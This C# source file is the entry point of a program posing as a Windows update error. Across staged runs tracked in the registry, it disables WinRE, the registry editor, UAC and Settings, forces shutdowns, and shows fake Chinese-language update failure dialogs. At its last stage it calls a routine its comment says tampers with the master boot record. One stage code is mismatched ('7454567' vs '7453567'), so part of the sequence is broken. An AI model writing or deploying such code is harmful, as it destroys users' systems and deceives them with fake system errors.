using System.Diagnostics;
using System.Security.Cryptography.X509Certificates;
using System.Text;

namespace Windows_Update_Error
{
    internal static class Program
    {
        /// <summary>
        ///  The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            // To customize application configuration such as set high DPI settings or default font,
            // see https://aka.ms/applicationconfiguration.
            ApplicationConfiguration.Initialize();
            Regedit_Set regedit1 = new Regedit_Set();
            Test test1 = new Test();
            
            StringBuilder regedit1_Start = new StringBuilder(regedit1.Start_Detection());         //获取启动码
            if (regedit1_Start.ToString() == "114514")
            {
                regedit1_Start.Replace(regedit1_Start.ToString(), "8479838");
                regedit1.Start_Update(regedit1_Start.ToString());
                try
                {
                    regedit1.PC_Start();
                    test1.Disable_WinRE();
                    regedit1.Disable_Regedit();
                }
                catch(Exception ex)
                {
                    MessageBox.Show(ex.Message,"错误",MessageBoxButtons.OK,MessageBoxIcon.Error);
                }
                regedit1.UAC_OFF();
                regedit1.Disable_Settings();
                Thread.Sleep(5000);
                test1.Shutdown_PC();
            }
            else if (regedit1_Start.ToString() == "8479838")
            {
                regedit1_Start.Replace(regedit1_Start.ToString(), "7454567");
                regedit1.Start_Update(regedit1_Start.ToString());
                msg1();
                Application.Run(new Form2());
            }
            else if (regedit1_Start.ToString() == "7453567")
            {
                regedit1_Start.Replace(regedit1_Start.ToString(), "84634846");
                regedit1.Start_Update(regedit1_Start.ToString());
                msg2();
                Application.Run(new Form2());
            }
            else if (regedit1_Start.ToString() == "84634846")
            {
                regedit1_Start.Replace(regedit1_Start.ToString(), "847327473");
                regedit1.Start_Update(regedit1_Start.ToString());
                msg3();
                Application.Run(new Form2());
            }
            else if (regedit1_Start.ToString() == "847327473")
            {
                test1.killmbrA();            //篡改硬盘的主引导文件
                test1.Nt_Error();
            }
            void msg1()
            {
                MessageBox.Show("更新失败，Windows无法修复你的电脑", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            void msg2()
            {
                MessageBox.Show("由于遇到了未知错误，无法正常加载Windows组件", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            void msg3()
            {
                MessageBox.Show("电脑无法恢复重要的Windows组件", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
    }
}